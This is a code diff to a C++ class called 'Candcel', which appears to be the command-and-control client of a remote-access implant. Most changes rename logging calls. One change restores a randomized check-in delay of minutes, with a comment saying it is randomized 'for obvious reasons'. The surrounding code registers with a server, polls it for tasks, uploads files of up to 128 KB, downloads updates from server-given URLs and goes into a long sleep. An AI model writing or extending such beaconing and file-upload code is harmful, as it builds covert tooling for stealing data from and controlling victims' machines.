@@ -14,13 +14,13 @@ Candcel *Candcel::s_Candcel = nullptr;
 
 Candcel::Candcel()
 {
-	Log::Info(L"Candcel", L"Initialize candcel class");
+	LogInfo(L"Candcel", L"Initialize candcel class");
 }
 
 
 Candcel::~Candcel()
 {
-	Log::Info(L"Candcel", L"Terminate candcel class");
+	LogInfo(L"Candcel", L"Terminate candcel class");
 }
 
 
@@ -46,7 +46,7 @@ void Candcel::InitClass()
 
 bool Candcel::IsAlive()
 {
-	Log::Info(L"Candcel", L"Check if server is alive");
+	LogInfo(L"Candcel", L"Check if server is alive");
 
 	for (int i = 0; i < 10; ++i) {
 		RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());
@@ -57,12 +57,12 @@ bool Candcel::IsAlive()
 			return true;
 		}
 
-		Log::Error(L"Candcel", L"Server did not respond as expected, attempt " + std::to_wstring(i));
+		LogError(L"Candcel", L"Server did not respond as expected, attempt " + std::to_wstring(i));
 
 		Sleep(1000);
 	}
 
-	Log::Error(L"Candcel", L"Server did not respond as expected, giving up");
+	LogError(L"Candcel", L"Server did not respond as expected, giving up");
 
 	return false;
 }
@@ -74,8 +74,7 @@ DWORD Candcel::CheckIn()
 		int nextInterval = (rand() % (CHECKIN_PACE + 1));
 
 		/* Randomize the interval for obvious reasons */
-		//Sleep(nextInterval * 60 * 1000);
-		Sleep(nextInterval * 600);
+		Sleep(nextInterval * 60 * 1000);
 
 		if (!serverSolicitAck) {
 			Solicit();
@@ -85,7 +84,7 @@ DWORD Candcel::CheckIn()
 			continue;
 		}
 
-		Log::Info(L"Candcel", L"Sending checkin request");
+		LogInfo(L"Candcel", L"Sending checkin request");
 
 #ifdef DEBUG
 		LARGE_INTEGER frequency;
@@ -104,15 +103,15 @@ DWORD Candcel::CheckIn()
 		JSONValue *returnObj = rc.Call(RestClientCommand::CM_CLIENT_CHECKIN, new JSONValue(obj));
 
 		if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
-			Log::Error(L"Candcel", L"Request failed");
+			LogError(L"Candcel", L"Request failed");
 		}
 
 #ifdef DEBUG
 		QueryPerformanceCounter(&t2);
 		elapsedTime = (int)((t2.QuadPart - t1.QuadPart) * 1000 / frequency.QuadPart);
-#endif
 
-		Log::Info(L"Candcel", L"Remote at " + std::to_wstring(elapsedTime) + L"ms");
+		LogInfo(L"Candcel", L"Remote at " + std::to_wstring(elapsedTime) + L"ms");
+#endif
 
 		/* Check for tasks */
 		if (returnObj) {
@@ -159,7 +158,7 @@ DWORD Candcel::CheckIn()
 
 void Candcel::Solicit()
 {
-	Log::Info(L"Candcel", L"Notify the server of this instance");
+	LogInfo(L"Candcel", L"Notify the server of this instance");
 
 	RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());
 
@@ -188,7 +187,7 @@ void Candcel::Solicit()
 	rc.Call(RestClientCommand::CM_CLIENT_SOLICIT, new JSONValue(obj));
 
 	if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
-		Log::Error(L"Candcel", L"Request failed");
+		LogError(L"Candcel", L"Request failed");
 
 		serverSolicitAck = false;
 		return;
@@ -200,10 +199,10 @@ void Candcel::Solicit()
 
 void Candcel::UploadFile(const std::wstring& name, const std::wstring& content)
 {
-	Log::Info(L"Candcel", L"Upload file to server");
+	LogInfo(L"Candcel", L"Upload file to server");
 
 	if (content.size() > 128 * 1024) {
-		Log::Error(L"Candcel", L"File too large");
+		LogError(L"Candcel", L"File too large");
 		return;
 	}
 
@@ -217,7 +216,7 @@ void Candcel::UploadFile(const std::wstring& name, const std::wstring& content)
 	rc.Call(RestClientCommand::CM_CLIENT_UPLOAD, new JSONValue(obj));
 
 	if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
-		Log::Error(L"Candcel", L"Request failed");
+		LogError(L"Candcel", L"Request failed");
 	}
 }
 
@@ -228,7 +227,7 @@ void Candcel::GetUpdate(unsigned int buildNumber, const std::wstring& wurl)
 		return;
 	}
 
-	Log::Info(L"Candcel", L"Sending update request for version " + Config::getVersion(buildNumber));
+	LogInfo(L"Candcel", L"Sending update request for version " + Config::getVersion(buildNumber));
 
 	std::string url(wurl.begin(), wurl.end());
 
@@ -249,7 +248,7 @@ void Candcel::CheckForUpdate()
 		return;
 	}
 
-	Log::Info(L"Candcel", L"Check for update");
+	LogInfo(L"Candcel", L"Check for update");
 
 	RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());
 
@@ -260,25 +259,25 @@ void Candcel::CheckForUpdate()
 
 	if (rc.getServerCode() == RestServerCommand::CM_SERVER_UPDATE) {
 		if (!returnObj->IsObject()) {
-			Log::Error(L"Candcel", L"Server returned no object");
+			LogError(L"Candcel", L"Server returned no object");
 			return;
 		}
 
-		Log::Info(L"Candcel", L"Update available");
+		LogInfo(L"Candcel", L"Update available");
 
 		unsigned int build = static_cast<unsigned int>(returnObj->Child(L"build")->AsNumber());
 		std::wstring url = returnObj->Child(L"url")->AsString();
 
 		GetUpdate(build, url);
 	} else if (rc.getServerCode() != RestServerCommand::CM_SERVER_IGNORE) {
-		Log::Error(L"Candcel", L"Request failed");
+		LogError(L"Candcel", L"Request failed");
 	}
 }
 
 
 void Candcel::DeepSleep()
 {
-	Log::Warn(L"Candcel", L"Enter deepsleep");
+	LogWarn(L"Candcel", L"Enter deepsleep");
 
 	Sleep(30 * 60 * 1000);
 }
